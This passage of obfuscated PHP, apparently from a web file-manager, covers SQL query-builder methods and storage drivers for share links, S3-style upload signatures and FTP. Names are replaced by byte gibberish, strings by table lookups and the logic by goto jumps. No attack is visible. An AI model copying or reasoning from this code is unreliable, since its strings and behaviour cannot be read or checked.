in_array(strtoupper(trim($DŠõ¸ÔÎ)), array($Då”Ú´© [922], $Då”Ú´© [923])) ? $Då”Ú´© [50] . $DŠõ¸ÔÎ : $Då”Ú´© [33]; if (preg_match($Då”Ú´© [924], $e¼ä’Åµò¶)) { $d¹í†‚ˆ°¥[] = $this->parseKey($e¼ä’Åµò¶) . $DŠõ¸ÔÎ; } else { think_exception($Då”Ú´© [925] . $e¼ä’Åµò¶); } } } $f£»Ê”ó Š = implode($Då”Ú´© [47], $d¹í†‚ˆ°¥); } return !empty($f£»Ê”ó Š) ? $Då”Ú´© [926] . $f£»Ê”ó Š : $Då”Ú´© [33]; } protected function parseGroup($C¸ºØ•Ú²¿) { $c²áˆŞ‘’ =& $_SERVER[‘®…¢À]; return !empty($C¸ºØ•Ú²¿) ? $c²áˆŞ‘’[927] . $C¸ºØ•Ú²¿ : $c²áˆŞ‘’[33]; } protected function parseHaving($c¹êßà²î) { $f›Ï’’…×â =& $_SERVER[‘®…¢À]; return !empty($c¹êßà²î) ? $f›Ï’’…×â[928] . $c¹êßà²î : $f›Ï’’…×â[33]; } protected function parseComment($EôÖù¿Íæ) { $bÜ¿™¥Û˜ =& $_SERVER[‘®…¢À]; return !empty($EôÖù¿Íæ) ? $bÜ¿™¥Û˜[929] . $EôÖù¿Íæ . $bÜ¿™¥Û˜[930] : $bÜ¿™¥Û˜[33]; } protected function parseDistinct($a²¢•¼§‚) { $e™Š«¼¯„ì =& $_SERVER[‘®…¢À]; return !empty($a²¢•¼§‚) ? $e™Š«¼¯„ì[931] : $e™Š«¼¯„ì[33]; } protected function parseUnion($c£¤æ‹×Ê¢) { $BÍŠÏäÅ—´ =& $_SERVER[‘®…¢À]; if (empty($c£¤æ‹×Ê¢)) { return $BÍŠÏäÅ—´[33]; } if (isset($c£¤æ‹×Ê¢[$BÍŠÏäÅ—´[333]])) { $AÙ±Î±Ì = $BÍŠÏäÅ—´[932]; unset($c£¤æ‹×Ê¢[$BÍŠÏäÅ—´[333]]); } else { $AÙ±Î±Ì = $BÍŠÏäÅ—´[933]; } foreach ($c£¤æ‹×Ê¢ as $c¢–­ªª) { $AíğëØ¾ù[] = $AÙ±Î±Ì . (is_array($c¢–­ªª) ? $this->buildSelectSql($c¢–­ªª) : $c¢–­ªª); } return implode($BÍŠÏäÅ—´[50], $AíğëØ¾ù); } public function insert($f‡Ò¢Äø, $fÅŠ´±øÔ³ = array(), $DÙë©£…à = false) { goto dÙšÀ²ÈÆé; EÊ™—¸«óé: foreach ($f‡Ò¢Äø as $A‡Í‰†®¦Œ => $a¿ïµ¦¹‚µ) { if (is_array($a¿ïµ¦¹‚µ) && $B·ñì‡Á†[282] == $a¿ïµ¦¹‚µ[0]) { $A‘±øíƒÀù[] = $this->parseKey($A‡Í‰†®¦Œ); $fÍŒÄ˜ ¦¦[] = $a¿ïµ¦¹‚µ[1]; } elseif (is_scalar($a¿ïµ¦¹‚µ) || is_null($a¿ïµ¦¹‚µ)) { $A‘±øíƒÀù[] = $this->parseKey($A‡Í‰†®¦Œ); $fÍŒÄ˜ ¦¦[] = $this->parseValue($a¿ïµ¦¹‚µ); } } $Bïö§ËÖÇ¸ = ($DÙë©£…à ? $B·ñì‡Á†[799] : $B·ñì‡Á†[800]) . $B·ñì‡Á†[801] . $this->parseTable($fÅŠ´±øÔ³[$B·ñì‡Á†[264]]) . $B·ñì‡Á†[795] . implode($B·ñì‡Á†[47], $A‘±øíƒÀù) . $B·ñì‡Á†[796] . implode($B·ñì‡Á†[47], $fÍŒÄ˜ ¦¦) . $B·ñì‡Á†[797]; $Bïö§ËÖÇ¸ .= $this->parseLock(isset($fÅŠ´±øÔ³[$B·ñì‡Á†[752]]) ? $fÅŠ´±øÔ³[$B·ñì‡Á†[752]] : !1); goto cõ¯™²ˆ·è; cõ¯™²ˆ·è: $Bïö§ËÖÇ¸ .= $this->parseComment(!empty($fÅŠ´±øÔ³[$B·ñì‡Á†[337]]) ? $fÅŠ´±øÔ³[$B·ñì‡Á†[337]] : $B·ñì‡Á†[33]); return $this->execute($Bïö§ËÖÇ¸, $this->parseBind(!empty($fÅŠ´±øÔ³[$B·ñì‡Á†[270]]) ? $fÅŠ´±øÔ³[$B·ñì‡Á†[270]] : array())); goto b‡‚õªİ‡ƒ; dÙšÀ²ÈÆé: $B·ñì‡Á† =& $_SERVER[‘®…¢À]; $fÍŒÄ˜ ¦¦ = $A‘±øíƒÀù = array(); $this->model = $fÅŠ´±øÔ³[$B·ñì‡Á†[266]]; goto EÊ™—¸«óé; b‡‚õªİ‡ƒ: } public function selectInsert($Dï÷«ÎÑ•â, $c…ÆºéÃÂ, $EÎ¿ì¶‡÷„ = array()) { goto F™Å¼«Åã¼; AÑšÃÇ”‚Ğ: return $this->execute($d÷â‹æš¤İ, $this->parseBind(!empty($EÎ¿ì¶‡÷„[$B…ğÄŒ½Ùù[270]]) ? $EÎ¿ì¶‡÷„[$B…ğÄŒ½Ùù[270]] : array())); goto DôÕ÷…–…¥; c‚ñÆ¢ĞŞ: array_walk($Dï÷«ÎÑ•â, array($this, $B…ğÄŒ½Ùù[798])); $d÷â‹æš¤İ = $B…ğÄŒ½Ùù[934] . $this->parseTable($c…ÆºéÃÂ) . $B…ğÄŒ½Ùù[795] . implode($B…ğÄŒ½Ùù[47], $Dï÷«ÎÑ•â) . $B…ğÄŒ½Ùù[913]; $d÷â‹æš¤İ .= $this->buildSelectSql($EÎ¿ì¶‡÷„); goto AÑšÃÇ”‚Ğ; F™Å¼«Åã¼: $B…ğÄŒ½Ùù =& $_SERVER[‘®…¢À]; $this->model = $EÎ¿ì¶‡÷„[$B…ğÄŒ½Ùù[266]]; if (is_string($Dï÷«ÎÑ•â)) { $Dï÷«ÎÑ•â = explode($B…ğÄŒ½Ùù[47], $Dï÷«ÎÑ•â); } goto c‚ñÆ¢ĞŞ; DôÕ÷…–…¥: } public function update($cˆö²øêîê, $cˆŸÉ¹·) { $DÙŠÜ±«‚« =& $_SERVER[‘®…¢À]; $this->model = $cˆŸÉ¹·[$DÙŠÜ±«‚«[266]]; $A»È¾Û…¤  = $DÙŠÜ±«‚«[935] . $this->parseTable($cˆŸÉ¹·[$DÙŠÜ±«‚«[264]]) . $this->parseSet($cˆö²øêîê) . $this->parseWhere(!empty($cˆŸÉ¹·[$DÙŠÜ±«‚«[260]]) ? $cˆŸÉ¹·[$DÙŠÜ±«‚«[260]] : $DÙŠÜ±«‚«[33]) . $this->parseOrder(!empty($cˆŸÉ¹·[$DÙŠÜ±«‚«[346]]) ? $cˆŸÉ¹·[$DÙŠÜ±«‚«[346]] : $DÙŠÜ±«‚«[33]) . $this->parseLimit(!empty($cˆŸÉ¹·[$DÙŠÜ±«‚«[277]]) ? $cˆŸÉ¹·[$DÙŠÜ±«‚«[277]] : $DÙŠÜ±«‚«[33]) . $this->parseLock(isset($cˆŸÉ¹·[$DÙŠÜ±«‚«[752]]) ? $cˆŸÉ¹·[$DÙŠÜ±«‚«[752]] : !1) . $this->parseComment(!empty($cˆŸÉ¹·[$DÙŠÜ±«‚«[337]]) ? $cˆŸÉ¹·[$DÙŠÜ±«‚«[337]] : $DÙŠÜ±«‚«[33]); return $this->execute($A»È¾Û…¤ , $this->parseBind(!empty($cˆŸÉ¹·[$DÙŠÜ±«‚«[270]]) ? $cˆŸÉ¹·[$DÙŠÜ±«‚«[270]] : array())); } public function delete($a¬îà»‚œ¥ = array()) { $bÁ¿¢÷ò =& $_SERVER[‘®…¢À]; $this->model = $a¬îà»‚œ¥[$bÁ¿¢÷ò[266]]; $DßíåœõÒ¤ = $bÁ¿¢÷ò[936] . $this->parseTable($a¬îà»‚œ¥[$bÁ¿¢÷ò[264]]) . $this->parseWhere(!empty($a¬îà»‚œ¥[$bÁ¿¢÷ò[260]]) ? $a¬îà»‚œ¥[$bÁ¿¢÷ò[260]] : $bÁ¿¢÷ò[33]) . $this->parseOrder(!empty($a¬îà»‚œ¥[$bÁ¿¢÷ò[346]]) ? $a¬îà»‚œ¥[$bÁ¿¢÷ò[346]] : $bÁ¿¢÷ò[33]) . $this->parseLimit(!empty($a¬îà»‚œ¥[$bÁ¿¢÷ò[277]]) ? $a¬îà»‚œ¥[$bÁ¿¢÷ò[277]] : $bÁ¿¢÷ò[33]) . $this->parseLock(isset($a¬îà»‚œ¥[$bÁ¿¢÷ò[752]]) ? $a¬îà»‚œ¥[$bÁ¿¢÷ò[752]] : !1) . $this->parseComment(!empty($a¬îà»‚œ¥[$bÁ¿¢÷ò[337]]) ? $a¬îà»‚œ¥[$bÁ¿¢÷ò[337]] : $bÁ¿¢÷ò[33]); return $this->execute($DßíåœõÒ¤, $this->parseBind(!empty($a¬îà»‚œ¥[$bÁ¿¢÷ò[270]]) ? $a¬îà»‚œ¥[$bÁ¿¢÷ò[270]] : array())); } public function select($DÕ™æÖ¡Øˆ = array()) { goto b”ğÀõÈ½›; aÖáªÒ„¸‹: if ($CÖğØÏ¼Êè && !1 !== $cÑ‰âºõ˜) { think_cache($C²äñ˜®‰, $cÑ‰âºõ˜, $CÖğØÏ¼Êè); } return $cÑ‰âºõ˜; goto D…â½ÍÓ†; aÉàÀä¡Ş¹: $CÖğØÏ¼Êè = isset($DÕ™æÖ¡Øˆ[$AòïÆÆ¨òŒ[334]]) ? $DÕ™æÖ¡Øˆ[$AòïÆÆ¨òŒ[334]] : !1; if ($CÖğØÏ¼Êè) { $C²äñ˜®‰ = is_string($CÖğØÏ¼Êè[$AòïÆÆ¨òŒ[90]]) ? $CÖğØÏ¼Êè[$AòïÆÆ¨òŒ[90]] : $AòïÆÆ¨òŒ[937] . md5($f³‰ò åÖµ); $EÏ‚¬…¡Íø = think_cache($C²äñ˜®‰, $AòïÆÆ¨òŒ[33], $CÖğØÏ¼Êè); if (!1 !== $EÏ‚¬…¡Íø) { return $EÏ‚¬…¡Íø; } } $cÑ‰âºõ˜ = $this->query($f³‰ò åÖµ, $this->parseBind(!empty($DÕ™æÖ¡Øˆ[$AòïÆÆ¨òŒ[270]]) ? $DÕ™æÖ¡Øˆ[$AòïÆÆ¨òŒ[270]] : array())); goto aÖáªÒ„¸‹; b”ğÀõÈ½›: $AòïÆÆ¨òŒ =& $_SERVER[‘®…¢À]; $this->model = $DÕ™æÖ¡Øˆ[$AòïÆÆ¨òŒ[266]]; $f³‰ò åÖµ = $this->buildSelectSql($DÕ™æÖ¡Øˆ); goto aÉàÀä¡Ş¹; D…â½ÍÓ†: } public function buildSelectSql($CÁ¢†òÚö‘ = array()) { goto E¥×ÑğÕìã; còê¦ñ…†Ø: $fŒÏÏ•İ—Š = $this->parseSql($this->selectSql, $CÁ¢†òÚö‘); $fŒÏÏ•İ—Š .= $this->parseLock(isset($CÁ¢†òÚö‘[$F×ğ¶ôêÑø[752]]) ? $CÁ¢†òÚö‘[$F×ğ¶ôêÑø[752]] : !1); if (isset($a™ˆ—Æë ñ)) { think_cache($a™ˆ—Æë ñ, $fŒÏÏ•İ—Š); } goto a„Ù“ŠØ´; E¥×ÑğÕìã: $F×ğ¶ôêÑø =& $_SERVER[‘®…¢À]; if (isset($CÁ¢†òÚö‘[$F×ğ¶ôêÑø[336]])) { if (strpos($CÁ¢†òÚö‘[$F×ğ¶ôêÑø[336]], $F×ğ¶ôêÑø[47])) { list($eŞŒÙ»Œ‰¶, $CƒİÌˆàëœ) = explode($F×ğ¶ôêÑø[47], $CÁ¢†òÚö‘[$F×ğ¶ôêÑø[336]]); } else { $eŞŒÙ»Œ‰¶ = $CÁ¢†òÚö‘[$F×ğ¶ôêÑø[336]]; } $eŞŒÙ»Œ‰¶ = $eŞŒÙ»Œ‰¶ ? $eŞŒÙ»Œ‰¶ : 1; $CƒİÌˆàëœ = isset($CƒİÌˆàëœ) ? $CƒİÌˆàëœ : (is_numeric($CÁ¢†òÚö‘[$F×ğ¶ôêÑø[277]]) ? $CÁ¢†òÚö‘[$F×ğ¶ôêÑø[277]] : 20); $bó–“ ©ä = $CƒİÌˆàëœ * ((int) $eŞŒÙ»Œ‰¶ - 1); $CÁ¢†òÚö‘[$F×ğ¶ôêÑø[277]] = $bó–“ ©ä . $F×ğ¶ôêÑø[47] . $CƒİÌˆàëœ; } if (think_config($F×ğ¶ôêÑø[938])) { $a™ˆ—Æë ñ = $F×ğ¶ôêÑø[939] . md5(serialize($CÁ¢†òÚö‘)); $DÖ–ÇÈÁªß = think_cache($a™ˆ—Æë ñ); if ($DÖ–ÇÈÁªß) { return $DÖ–ÇÈÁªß; } } goto còê¦ñ…†Ø; a„Ù“ŠØ´: return $fŒÏÏ•İ—Š; goto cÉ‚ßÁˆùÚ; cÉ‚ßÁˆùÚ: } public function parseSql($fÖÀØåóÎ, $a•ÇŠ–³Ç = array()) { $cïĞ‹ÚêºÌ =& $_SERVER[‘®…¢À]; $fÖÀØåóÎ = str_replace(array($cïĞ‹ÚêºÌ[940], $cïĞ‹ÚêºÌ[941], $cïĞ‹ÚêºÌ[942], $cïĞ‹ÚêºÌ[943], $cïĞ‹ÚêºÌ[944], $cïĞ‹ÚêºÌ[945], $cïĞ‹ÚêºÌ[946], $cïĞ‹ÚêºÌ[947], $cïĞ‹ÚêºÌ[948], $cïĞ‹ÚêºÌ[949], $cïĞ‹ÚêºÌ[950]), array($this->parseTable("{$a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[264]]}"), $this->parseDistinct(isset($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[951]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[951]] : !1), $this->parseField(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[258]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[258]] : $cïĞ‹ÚêºÌ[173]), $this->parseJoin(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[267]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[267]] : $cïĞ‹ÚêºÌ[33]), $this->parseWhere(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[260]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[260]] : $cïĞ‹ÚêºÌ[33]), $this->parseGroup(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[952]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[952]] : $cïĞ‹ÚêºÌ[33]), $this->parseHaving(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[953]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[953]] : $cïĞ‹ÚêºÌ[33]), $this->parseOrder(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[346]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[346]] : $cïĞ‹ÚêºÌ[33]), $this->parseLimit(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[277]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[277]] : $cïĞ‹ÚêºÌ[33]), $this->parseUnion(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[332]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[332]] : $cïĞ‹ÚêºÌ[33]), $this->parseComment(!empty($a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[337]]) ? $a•ÇŠ–³Ç[$cïĞ‹ÚêºÌ[337]] : $cïĞ‹ÚêºÌ[33])), $fÖÀØåóÎ); return $fÖÀØåóÎ; } public function getLastSql($bÃá‡ÂÙšù = '') { return $bÃá‡ÂÙšù ? $this->modelSql[$bÃá‡ÂÙšù] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($aÌÇ‘ÊŞ®) { return addslashes($aÌÇ‘ÊŞ®); } public function setModel($D»æö×£ù) { $this->model = $D»æö×£ù; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto d“Â˜à†«; EÄ…¾ÛÑÒÕ: function beforeShutdownFatalError($A×ï‘Üí°Ø) { think_exception($A×ï‘Üí°Ø); } $_SERVER[$_SERVER[Á][47]] = $e¶¡¶øœø®($_SERVER[$_SERVER[Á][44]]); $eÉ÷¸·¾ä¹ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto F“ Úàç†÷; a ŸõâË¦: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($f·×šÃïŞÎ) { $this->pathParse = $f·×šÃïŞÎ; } protected function infoParse($Cµëßªî›) { $DåÂßĞºô¼ =& $_SERVER[‘®…¢À]; return Action($DåÂßĞºô¼[974])->sharePathInfo($this->pathParse[$DåÂßĞºô¼[76]], !0); } public function listPath($DªìÃ³—Ü, $FÕŸ¡¾ìŒÌ = false) { $D‚ß¸ö¶† =& $_SERVER[‘®…¢À]; $EÎĞªÄ¶ÃË = IO::listPath($DªìÃ³—Ü, $FÕŸ¡¾ìŒÌ); foreach ($EÎĞªÄ¶ÃË as $eêá…½ÑÙö => $e‚¥ˆÍƒ÷²) { if (!in_array($eêá…½ÑÙö, array($D‚ß¸ö¶†[74], $D‚ß¸ö¶†[75]))) { continue; } foreach ($e‚¥ˆÍƒ÷² as $AŸäæ³¸º¿ => $B”Å†Ï¥¥) { $EÎĞªÄ¶ÃË[$eêá…½ÑÙö][$AŸäæ³¸º¿] = Action($D‚ß¸ö¶†[974])->shareItemInfo($B”Å†Ï¥¥); } } return $EÎĞªÄ¶ÃË; } public function listAll($BšÉå„ğ„) { $FóÎœ•†  =& $_SERVER[‘®…¢À]; $aë‚‡ÎêÈ³ = IO::listAll($BšÉå„ğ„); foreach ($aë‚‡ÎêÈ³ as &$CæÓ¾ëãÃ) { $CæÓ¾ëãÃ = array_merge(IO::info($CæÓ¾ëãÃ[$FóÎœ•† [76]]), $CæÓ¾ëãÃ); $CæÓ¾ëãÃ[$FóÎœ•† [387]] = Action($FóÎœ•† [974])->shareItemInfo($CæÓ¾ëãÃ); } return $aë‚‡ÎêÈ³; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($F¸Î†º¢›†) { parent::__construct($F¸Î†º¢›†); $this->signatureVersion($_SERVER[‘®…¢À][197]); } public function uploadFormData($B¸¼Œàô”, $C†àô´  = 3600) { goto c¬ŸÂå®¹Í; CÚ…Ùå£†˜: $CÏÜ‰Ë×… = $d›·Ä¥ÖŒ°[1086]; $CÜÎ½ä¹ = $C†àô´  . $d›·Ä¥ÖŒ°[33]; $bÄ¦ƒ•àöÊ = $d›·Ä¥ÖŒ°[1050]; goto F½²ïÂÎšã; D…¾’ˆ‡Ò : $c¨¶Üœ­Õ¬ = array($d›·Ä¥ÖŒ°[196] => $d›·Ä¥ÖŒ°[33], $d›·Ä¥ÖŒ°[1096] => $d›·Ä¥ÖŒ°[33], $d›·Ä¥ÖŒ°[1054] => $d¦âŠŒ¹è, $d›·Ä¥ÖŒ°[1058] => $bÄ¦ƒ•àöÊ, $d›·Ä¥ÖŒ°[1062] => $få÷ìÓÁ¨Ï, $d›·Ä¥ÖŒ°[1097] => $DÔÀ¯‚„Ù¨, $d›·Ä¥ÖŒ°[1098] => $e¢”²®êš—, $d›·Ä¥ÖŒ°[1099] => $C”åá°¦ñ”, $d›·Ä¥ÖŒ°[1100] => $CÜÎ½ä¹, $d›·Ä¥ÖŒ°[1101] => $EÅæã³÷Š‘, $d›·Ä¥ÖŒ°[166] => $this->getHost()); return $c¨¶Üœ­Õ¬; goto D¤«ã¹î³; c¬ŸÂå®¹Í: $d›·Ä¥ÖŒ° =& $_SERVER[‘®…¢À]; $d¦âŠŒ¹è = $d›·Ä¥ÖŒ°[182]; $e¢”²®êš— = $d›·Ä¥ÖŒ°[1084]; goto Bô“çÒµÀ; Bô“çÒµÀ: $Cº²¤‹†µ¢ = $d›·Ä¥ÖŒ°[59]; $C”åá°¦ñ” = gmdate($d›·Ä¥ÖŒ°[1085]); $DŠÅ£‰•¢ = gmdate($d›·Ä¥ÖŒ°[663]); goto CÚ…Ùå£†˜; CÌØßÀ¹Ä: $få÷ìÓÁ¨Ï = base64_encode(json_encode($AÏ¿ª²‡Ã)); $Dñ÷Õ÷–´ò = hash_hmac($d›·Ä¥ÖŒ°[1094], $DŠÅ£‰•¢, $d›·Ä¥ÖŒ°[1095] . $this->secret, !0); $c‰ñªÀ³Œ‡ = hash_hmac($d›·Ä¥ÖŒ°[1094], $this->region, $Dñ÷Õ÷–´ò, !0); goto E£ØÎµÂ¢¶; F½²ïÂÎšã: $f©–È¯Û§ = array($this->accessKey, $DŠÅ£‰•¢, $this->region, $Cº²¤‹†µ¢, $CÏÜ‰Ë×…); $DÔÀ¯‚„Ù¨ = implode($d›·Ä¥ÖŒ°[8], $f©–È¯Û§); $AÏ¿ª²‡Ã = array($d›·Ä¥ÖŒ°[1052] => gmdate($d›·Ä¥ÖŒ°[1051], strtotime($d›·Ä¥ÖŒ°[1087])), $d›·Ä¥ÖŒ°[1053] => array(array($d›·Ä¥ÖŒ°[1055] => $this->bucket), array($d›·Ä¥ÖŒ°[1054] => $d¦âŠŒ¹è), array($d›·Ä¥ÖŒ°[1056], $d›·Ä¥ÖŒ°[1057], $d›·Ä¥ÖŒ°[33]), array($d›·Ä¥ÖŒ°[1056], $d›·Ä¥ÖŒ°[1088], $d›·Ä¥ÖŒ°[33]), array($d›·Ä¥ÖŒ°[1056], $d›·Ä¥ÖŒ°[1089], $d›·Ä¥ÖŒ°[33]), array($d›·Ä¥ÖŒ°[1058] => $bÄ¦ƒ•àöÊ), array($d›·Ä¥ÖŒ°[1090] => $DÔÀ¯‚„Ù¨), array($d›·Ä¥ÖŒ°[1091] => $e¢”²®êš—), array($d›·Ä¥ÖŒ°[1092] => $C”åá°¦ñ”), array($d›·Ä¥ÖŒ°[1093] => $CÜÎ½ä¹))); goto CÌØßÀ¹Ä; E£ØÎµÂ¢¶: $A¤¯»ö‘‘İ = hash_hmac($d›·Ä¥ÖŒ°[1094], $Cº²¤‹†µ¢, $c‰ñªÀ³Œ‡, !0); $e©Ğ£åÙ¦ç = hash_hmac($d›·Ä¥ÖŒ°[1094], $CÏÜ‰Ë×…, $A¤¯»ö‘‘İ, !0); $EÅæã³÷Š‘ = hash_hmac($d›·Ä¥ÖŒ°[1094], $få÷ìÓÁ¨Ï, $e©Ğ£åÙ¦ç); goto D…¾’ˆ‡Ò ; D¤«ã¹î³: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($CãåÉ¥ò–) { parent::__construct(); if (count($CãåÉ¥ò–) > 0) { $this->_init($CãåÉ¥ò–); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($bğùëïÛÒ÷) { $eæ—İå¸·ê =& $_SERVER[‘®…¢À]; global $config; $this->appCharset = $config[$eæ—İå¸·ê[1102]]; $this->systemCharset = $config[$eæ—İå¸·ê[1103]]; if (isset($bğùëïÛÒ÷[$eæ—İå¸·ê[1104]]) && $bğùëïÛÒ÷[$eæ—İå¸·ê[1104]]) { $this->systemCharset = $bğùëïÛÒ÷[$eæ—İå¸·ê[1104]]; } } public function iconvApp($d¶³Ë†¿Ì) { return $this->iconvTo($d¶³Ë†¿Ì, $this->systemCharset, $this->appCharset); } public function iconvSystem($BÏÄƒ‚İ¶¨) { return $this->iconvTo($BÏÄƒ‚İ¶¨, $this->appCharset, $this->systemCharset); } public function getPathOuter($C‹¯Àé£§) { goto C¢ŒâŞæ±š; E–ãÔŠÌƒƒ: $C‹¯Àé£§ = KodIO::clear($C‹¯Àé£§); $C‹¯Àé£§ = substr($C‹¯Àé£§, strlen($bŠ‘’ëñ“Ù)); if (empty($this->pathDriver)) { return $C‹¯Àé£§; } goto cĞ¸ÆÒçà„; e›ìÆ—„·: if (substr($bŠ‘’ëñ“Ù, 0, 2) == $AÅªñ±ºä[1105]) { $bŠ‘’ëñ“Ù = BASIC_PATH . substr($bŠ‘’ëñ“Ù, 2); } if (substr($C‹¯Àé£§, 0, 2) == $AÅªñ±ºä[1105]) { $C‹¯Àé£§ = BASIC_PATH . substr($C‹¯Àé£§, 2); } $bŠ‘’ëñ“Ù = KodIO::clear($bŠ‘’ëñ“Ù); goto E–ãÔŠÌƒƒ; C¢ŒâŞæ±š: $AÅªñ±ºä =& $_SERVER[‘®…¢À]; $bŠ‘’ëñ“Ù = $this->iconvApp($this->pathBase); $C‹¯Àé£§ = $this->iconvApp($C‹¯Àé£§); goto e›ìÆ—„·; cĞ¸ÆÒçà„: return $this->pathDriver . $AÅªñ±ºä[8] . ltrim($C‹¯Àé£§, $AÅªñ±ºä[8]); goto E©“¸–¹²Ä; E©“¸–¹²Ä: } private function _init($a£çÄ¡Íà = array()) { goto f¹„ŒÍÀ¸µ; D§ö›¯„: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $fğ¥àï‡¦ğ[$câ“‘¶Û±‰] = array($B’İùÌ‰Š[1111] => $this->connect, $B’İùÌ‰Š[166] => $this->host, $B’İùÌ‰Š[165] => $this->scheme, $B’İùÌ‰Š[167] => $this->port); goto dŒÓ“„åéœ; aŠ¶Ù¸³îÂ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $CàçÂ¶ÜÌÀ = @ftp_login($this->connect, $this->username, $this->userpass); goto D§ö›¯„; dŒÓ“„åéœ: return $CàçÂ¶ÜÌÀ; goto aĞÜöé¾ø; f¹„ŒÍÀ¸µ: $B’İùÌ‰Š =& $_SERVER[‘®…¢À]; if (!function_exists($B’İùÌ‰Š[1106])) { show_json(LNG($B’İùÌ‰Š[1107]), !1); } $this->charsetReset($a£çÄ¡Íà); goto b†º«‚˜åª; b†º«‚˜åª: foreach ($a£çÄ¡Íà as $eôâÇÇ­æ¹ => $côĞÎ§Åà‹) { if (isset($this->{$eôâÇÇ­æ¹})) { $this->{$eôâÇÇ­æ¹} = $côĞÎ§Åà‹; } } static $fğ¥àï‡¦ğ = array(); $câ“‘¶Û±‰ = md5(json_encode($a£çÄ¡Íà)); goto d÷“ŠŸù¿Ä; d÷“ŠŸù¿Ä: if (isset($fğ¥àï‡¦ğ[$câ“‘¶Û±‰])) { foreach ($fğ¥àï‡¦ğ[$câ“‘¶Û±‰] as $eôâÇÇ­æ¹ => $côĞÎ§Åà‹) { $this->{$eôâÇÇ­æ¹} = $côĞÎ§Åà‹; } return !0; } $a‡¸İÙÛ‹¸ = parse_url(trim($this->server, $B’İùÌ‰Š[8])); $this->host = $a‡¸İÙÛ‹¸[$B’İùÌ‰Š[166]]; goto C›£«‘Øê‚; C›£«‘Øê‚: $FŒÄÚáÜ‘ = isset($a‡¸İÙÛ‹¸[$B’İùÌ‰Š[165]]) && $a‡¸İÙÛ‹¸[$B’İùÌ‰Š[165]] == $B’İùÌ‰Š[1108] ? !0 : !1; $this->scheme = $FŒÄÚáÜ‘ ? $B’İùÌ‰Š[1109] : $B’İùÌ‰Š[1110]; $this->port = isset($a‡¸İÙÛ‹¸[$B’İùÌ‰Š[167]]) ? $a‡¸İÙÛ‹¸[$B’İùÌ‰Š[167]] : 21; goto aŠ¶Ù¸³îÂ; aĞÜöé¾ø: } private function _isconn() { return is_resource($this->connect); } public function mkfile($FÜ›ÔĞ§—À, $AÀù¯‡Áïã = '', $A†è»“Ö = REPEAT_RENAME) { if ($this->setContent($FÜ›ÔĞ§—À, $AÀù¯‡Áïã)) { return $this->getPathOuter($FÜ›ÔĞ§—À); } return !1; } public function mkdir($f×–õÎ¤Å, $cˆ¡›ÙÕ²¼ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $f×–õÎ¤Å = $this->iconvSystem($f×–õÎ¤Å); if ($this->isFolder($f×–õÎ¤Å) || @ftp_mkdir($this->connect, $f×–õÎ¤Å)) { return $this->getPathOuter($f×–õÎ¤Å); } if (!$this->mkdir($this->pathFather($f×–õÎ¤Å))) { return !1; } if ($f×–õÎ¤Å = @ftp_mkdir($this->connect, $f×–õÎ¤Å)) { return $this->getPathOuter($f×–õÎ¤Å); } return !1; } public function copyFile($Fƒ·èÃ›, $eòàÌåä–¾) { goto C £ƒ­¿„•; f½°¡Ú¶¿: $this->tempFileRemve($Eï¿ˆ¨‹×Ş); return $f·†ğ÷¥ôĞ; goto aØÛ¢ÃëŸ; C £ƒ­¿„•: if (!$this->_isconn()) { return !1; } $dÜ•ß’îÕØ = $this->pathThis($this->iconvSystem($Fƒ·èÃ›)); $Eï¿ˆ¨‹×Ş = $this->tempFile($dÜ•ß’îÕØ); goto e²Ò×ç–; e²Ò×ç–: $B§ï“í‰ÆÖ = $this->iconvApp($Eï¿ˆ¨‹×Ş); $this->download($Fƒ·èÃ›, $B§ï“í‰ÆÖ); $f·†ğ÷¥ôĞ = $this->upload($eòàÌåä–¾, $B§ï“í‰ÆÖ); goto f½°¡Ú¶¿; aØÛ¢ÃëŸ: } public function moveFile($eéÃæ—§µ«, $aå›¢õïå) { if (!$this->_isconn()) { return !1; } $eéÃæ—§µ« = $this->iconvSystem($eéÃæ—§µ«); $aå›¢õïå = $this->iconvSystem($aå›¢õïå); $Bà†Ì½¤Ü» = @ftp_rename($this->connect, $eéÃæ—§µ«, $aå›¢õïå); return $Bà†Ì½¤Ü» ? $this->getPathOuter($aå›¢õïå) : !1; } public function delFile($aÍ¡¡—Ü¿‚) { if (!$this->_isconn()) { return !1; } $aÍ¡¡—Ü¿‚ = $this->iconvSystem($aÍ¡¡—Ü¿‚); return @ftp_delete($this->connect, $aÍ¡¡—Ü¿‚); } public function delFolder($c»ÚòÏ¤Ï†) { if (!$this->_isconn()) { return 